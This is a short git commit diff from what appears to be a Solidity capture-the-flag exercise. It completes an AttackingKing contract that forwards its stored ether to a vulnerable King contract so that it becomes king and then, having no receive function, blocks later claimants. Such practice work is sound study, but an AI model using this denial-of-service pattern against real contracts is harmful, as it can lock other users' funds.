3bc2d763ff83127dbbd5578081f691566ffd6425
Milan <milansaxena10@gmail.com>
2022-09-03 14:24:14 -0700

    Finished King.sol

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -3,14 +3,22 @@ pragma solidity ^0.8.9;
 import "./King.sol";
 import "hardhat/console.sol";
 
+interface KingInterface {
+    function _prize() external view returns (uint256);
+    receive() external payable;
+}
+
 contract AttackingKing {
     address public contractAddress;
+    uint256 public _value;
 
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
+        _value = msg.value;
     }
 
     function hackContract() external {
         // Code me!
+        payable(contractAddress).call{value: _value}("");
     }
 }
